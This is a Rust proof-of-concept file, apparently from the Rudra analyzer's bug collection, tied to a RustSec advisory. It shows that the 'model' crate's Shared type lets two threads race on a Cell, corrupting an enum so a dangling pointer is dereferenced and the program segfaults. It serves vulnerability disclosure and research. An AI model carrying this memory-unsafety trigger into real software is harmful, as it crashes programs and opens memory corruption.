/*!
```rudra-poc
[target]
crate = "model"
version = "0.1.2"

[[target.peer]]
crate = "crossbeam-utils"
version = "0.8.0"

[test]
analyzers = ["SendSyncVariance"]
bug_classes = ["SendSyncVariance"]

[report]
issue_url = "https://github.com/spacejam/model/issues/3"
issue_date = 2020-11-10
rustsec_url = "https://github.com/RustSec/advisory-db/pull/578"
unique_bugs = 1
additional_send_sync_violations = 1
```
!*/
#![forbid(unsafe_code)]

use model::Shared;

use crossbeam_utils::thread;
use std::cell::Cell;

#[derive(Debug, Clone, Copy)]
enum RefOrInt<'a> {
    Ref(&'a u64),
    Int(u64),
}

static SOME_INT: u64 = 123;

fn main() {
    let cell = Cell::new(RefOrInt::Ref(&SOME_INT));
    let shared = Shared::new(&cell);

    thread::scope(|s| {
        s.spawn(move |_| {
            loop {
                // Repeatedly write Ref(&addr) and Int(0xdeadbeef) into the cell.
                shared.set(RefOrInt::Ref(&SOME_INT));
                shared.set(RefOrInt::Int(0xdeadbeef));
            }
        });

        loop {
            if let RefOrInt::Ref(addr) = cell.get() {
                // Hope that between the time we pattern match the object as a
                // `Ref`, it gets written to by the other thread.
                if addr as *const u64 == &SOME_INT as *const u64 {
                    continue;
                }

                // Due to the data race, obtaining Ref(0xdeadbeef) is possible
                println!("Pointer is now: {:p}", addr);
                println!("Dereferencing addr will now segfault: {}", *addr);
            }
        }
    });
}
